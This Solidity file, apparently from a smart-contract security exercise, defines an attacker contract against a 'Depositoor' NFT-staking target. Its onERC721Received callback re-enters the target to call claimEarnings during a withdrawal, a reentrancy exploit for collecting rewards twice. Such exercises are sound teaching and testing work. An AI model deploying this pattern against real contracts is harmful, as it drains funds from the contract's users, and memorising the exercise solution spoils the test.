//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Capped.sol";
import "../RewardToken.sol";
import "hardhat/console.sol";

contract RewardTokenAttacker is IERC721Receiver {
    uint256 public counter;

    constructor() {
        console.log("attack constructor");
    }

    function stake(NftToStake nftContract, Depositoor depositoor, uint256 tokenId) public {
        console.log("stake entered");
        nftContract.safeTransferFrom(address(this), address(depositoor), tokenId);
        //console.log("successful transfer:", success);
        console.log("stake ended");
    }

    function attack(Depositoor depositoor, uint256 _tokenId) public {
        depositoor.withdrawAndClaimEarnings(_tokenId);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata)
        external
        override
        returns (bytes4)
    {
        console.log("attacker onERC721Received start");

        Depositoor(from).claimEarnings(tokenId);

        console.log("attacker onERC721Received end");
        return IERC721Receiver.onERC721Received.selector;
    }
}
